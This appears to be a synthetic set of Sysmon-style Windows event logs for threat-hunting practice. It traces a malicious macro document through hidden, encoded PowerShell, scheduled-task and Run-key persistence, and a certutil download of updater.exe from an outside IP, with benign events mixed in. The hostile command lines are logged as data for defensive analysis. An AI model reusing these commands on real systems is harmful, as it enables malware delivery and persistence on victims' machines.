[
  {"EventID": 1, "UtcTime": "2024-03-15 09:12:03.441", "ProcessId": 3144, "ParentProcessId": 2512,
   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
   "ParentImage": "C:\\Windows\\explorer.exe",
   "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jsmith\\Downloads\\Invoice_March2024.docm\"",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=a1b2c3d4e5f6"},

  {"EventID": 1, "UtcTime": "2024-03-15 09:12:47.112", "ProcessId": 7820, "ParentProcessId": 3144,
   "Image": "C:\\Windows\\System32\\cmd.exe",
   "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
   "CommandLine": "cmd.exe /c powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=b2c3d4e5f6a1"},

  {"EventID": 1, "UtcTime": "2024-03-15 09:12:47.883", "ProcessId": 8244, "ParentProcessId": 7820,
   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
   "ParentImage": "C:\\Windows\\System32\\cmd.exe",
   "CommandLine": "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=c3d4e5f6a1b2"},

  {"EventID": 1, "UtcTime": "2024-03-15 09:12:55.005", "ProcessId": 9312, "ParentProcessId": 8244,
   "Image": "C:\\Windows\\System32\\schtasks.exe",
   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
   "CommandLine": "schtasks.exe /Create /SC ONLOGON /TN \"WindowsUpdateHelper\" /TR \"C:\\ProgramData\\updater.exe\" /F",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=d4e5f6a1b2c3"},

  {"EventID": 1, "UtcTime": "2024-03-15 09:13:01.221", "ProcessId": 9500, "ParentProcessId": 8244,
   "Image": "C:\\Windows\\System32\\reg.exe",
   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
   "CommandLine": "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsUpdateHelper /t REG_SZ /d \"C:\\ProgramData\\updater.exe\" /f",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=e5f6a1b2c3d4"},

  {"EventID": 13, "UtcTime": "2024-03-15 09:13:01.335",
   "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateHelper",
   "Details": "C:\\ProgramData\\updater.exe",
   "Image": "C:\\Windows\\System32\\reg.exe",
   "ProcessId": 9500,
   "User": "MERIDIAN\\jsmith"},

  {"EventID": 1, "UtcTime": "2024-03-15 09:13:08.441", "ProcessId": 9780, "ParentProcessId": 8244,
   "Image": "C:\\Windows\\System32\\certutil.exe",
   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
   "CommandLine": "certutil.exe -urlcache -split -f http://185.220.101.47/updater.exe C:\\ProgramData\\updater.exe",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=f6a1b2c3d4e5"},

  {"EventID": 3, "UtcTime": "2024-03-15 09:13:09.002",
   "Image": "C:\\Windows\\System32\\certutil.exe",
   "ProcessId": 9780,
   "DestinationIp": "185.220.101.47", "DestinationPort": 80,
   "SourceIp": "10.0.1.55", "SourcePort": 51234,
   "User": "MERIDIAN\\jsmith"},

  {"EventID": 1, "UtcTime": "2024-03-15 07:45:12.001", "ProcessId": 1800, "ParentProcessId": 688,
   "Image": "C:\\Windows\\System32\\svchost.exe",
   "ParentImage": "C:\\Windows\\System32\\services.exe",
   "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
   "User": "NT AUTHORITY\\SYSTEM", "Hashes": "SHA256=aabbcc112233"},

  {"EventID": 1, "UtcTime": "2024-03-15 08:01:00.115", "ProcessId": 2640, "ParentProcessId": 1204,
   "Image": "C:\\Windows\\explorer.exe",
   "ParentImage": "C:\\Windows\\System32\\userinit.exe",
   "CommandLine": "C:\\Windows\\Explorer.EXE",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=aabbcc223344"},

  {"EventID": 1, "UtcTime": "2024-03-15 08:05:44.221", "ProcessId": 3020, "ParentProcessId": 2640,
   "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
   "ParentImage": "C:\\Windows\\explorer.exe",
   "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=aabbcc334455"},

  {"EventID": 1, "UtcTime": "2024-03-15 08:32:15.003", "ProcessId": 4100, "ParentProcessId": 2640,
   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
   "ParentImage": "C:\\Windows\\explorer.exe",
   "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=aabbcc445566"},

  {"EventID": 3, "UtcTime": "2024-03-15 08:45:00.112",
   "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
   "ProcessId": 3020,
   "DestinationIp": "142.250.185.46", "DestinationPort": 443,
   "SourceIp": "10.0.1.55", "SourcePort": 55100,
   "User": "MERIDIAN\\jsmith"},

  {"EventID": 3, "UtcTime": "2024-03-15 08:46:10.441",
   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
   "ProcessId": 4100,
   "DestinationIp": "40.101.5.130", "DestinationPort": 443,
   "SourceIp": "10.0.1.55", "SourcePort": 55200,
   "User": "MERIDIAN\\jsmith"},

  {"EventID": 11, "UtcTime": "2024-03-15 09:12:50.331",
   "TargetFilename": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage1.exe",
   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
   "ProcessId": 8244,
   "User": "MERIDIAN\\jsmith"},

  {"EventID": 11, "UtcTime": "2024-03-15 09:13:09.445",
   "TargetFilename": "C:\\ProgramData\\updater.exe",
   "Image": "C:\\Windows\\System32\\certutil.exe",
   "ProcessId": 9780,
   "User": "MERIDIAN\\jsmith"},

  {"EventID": 1, "UtcTime": "2024-03-15 09:00:00.001", "ProcessId": 5200, "ParentProcessId": 688,
   "Image": "C:\\Windows\\System32\\svchost.exe",
   "ParentImage": "C:\\Windows\\System32\\services.exe",
   "CommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
   "User": "NT AUTHORITY\\SYSTEM", "Hashes": "SHA256=aabb00112233"},

  {"EventID": 1, "UtcTime": "2024-03-15 09:30:00.111", "ProcessId": 6100, "ParentProcessId": 4100,
   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
   "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
   "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Outlook\\Salary_Review.docx\"",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=aabb11223344"},

  {"EventID": 13, "UtcTime": "2024-03-15 09:30:22.007",
   "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveStandaloneUpdater",
   "Details": "\"C:\\Program Files\\Microsoft OneDrive\\StandaloneUpdater\\OneDriveUpdaterService.exe\"",
   "Image": "C:\\Program Files\\Microsoft OneDrive\\StandaloneUpdater\\OneDriveUpdaterService.exe",
   "ProcessId": 7100,
   "User": "MERIDIAN\\jsmith"},

  {"EventID": 1, "UtcTime": "2024-03-15 10:00:00.001", "ProcessId": 9900, "ParentProcessId": 688,
   "Image": "C:\\Windows\\System32\\taskhostw.exe",
   "ParentImage": "C:\\Windows\\System32\\svchost.exe",
   "CommandLine": "taskhostw.exe {222A245B-E637-4AE9-827D-A66D6D2ED600}",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=aabb22334455"},

  {"EventID": 1, "UtcTime": "2024-03-15 10:05:11.882", "ProcessId": 10400, "ParentProcessId": 9900,
   "Image": "C:\\ProgramData\\updater.exe",
   "ParentImage": "C:\\Windows\\System32\\taskhostw.exe",
   "CommandLine": "C:\\ProgramData\\updater.exe --persist",
   "User": "MERIDIAN\\jsmith", "Hashes": "SHA256=f6a1b2c3d4e5"}
]
